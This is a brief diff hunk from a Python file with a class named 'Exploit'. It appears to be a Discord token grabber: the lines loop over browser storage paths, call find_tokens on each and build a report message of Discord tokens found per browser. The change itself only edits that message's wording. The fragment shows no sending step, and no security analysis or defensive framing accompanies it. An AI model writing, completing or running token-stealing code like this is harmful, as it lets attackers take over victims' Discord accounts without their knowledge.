@@ -136,7 +136,7 @@ class Exploit:
             if not os.path.exists(path):
                 continue
 
-            message = f'\nNew Discord Token found on **{platform}** Browser:\n```\n'
+            message = f'\nDiscord Token found on **{platform}** Browser:\n```\n'
 
             tokens = find_tokens(path)
 
